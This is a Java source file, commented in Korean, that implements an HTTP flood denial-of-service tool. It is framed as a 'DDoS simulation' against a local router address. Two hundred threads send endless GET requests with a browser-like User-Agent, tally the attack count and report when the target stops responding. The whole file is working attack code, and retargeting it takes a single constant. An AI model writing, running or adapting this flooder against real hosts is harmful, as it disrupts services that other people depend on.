import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class DdosExample {

    // 1. 공격 대상 설정 (로컬 환경의 공유기 등)
    private static final String TARGET_URL = "http://192.168.40.1/";
    // 2. 동시 공격 스레드 수 (컴퓨터 성능에 따라 조절)
    private static final int THREAD_COUNT = 200;

    private static AtomicInteger totalRequests = new AtomicInteger(0);

    public static void main(String[] args) {
        System.out.println("[!] 디도스 시뮬레이션을 시작합니다.");
        System.out.println(">> 타겟: " + TARGET_URL);
        System.out.println(">> 스레드 수: " + THREAD_COUNT);
        System.out.println("------------------------------------------");

        // 고정 스레드 풀 생성
        ExecutorService executor = Executors.newFixedThreadPool(THREAD_COUNT);

        // 스레드 개수만큼 무한 루프 작업 할당
        for (int i = 0; i < THREAD_COUNT; i++) {
            executor.execute(() -> {
                while (true) {
                    try {
                        sendAttack();
                    } catch (Exception e) {
                        // 서버가 마비되어 연결이 거부될 때 출력
                        System.err.println("[-] 연결 거부됨 (서버 마비 가능성)");
                    }
                }
            });
        }
    }

    private static void sendAttack() throws Exception {
        URL url = new URL(TARGET_URL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        // 요청 설정
        connection.setRequestMethod("GET");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
        connection.setConnectTimeout(1000); // 1초 안에 응답 없으면 타임아웃
        connection.setReadTimeout(1000);

        // 실제 전송 (응답 코드를 받는 순간 요청이 완료됨)
        int responseCode = connection.getResponseCode();

        int count = totalRequests.incrementAndGet();
        if (count % 100 == 0) {
            System.out.println("[+] 누적 공격 횟수: " + count + " | 상태 코드: " + responseCode);
        }

        connection.disconnect();
    }
}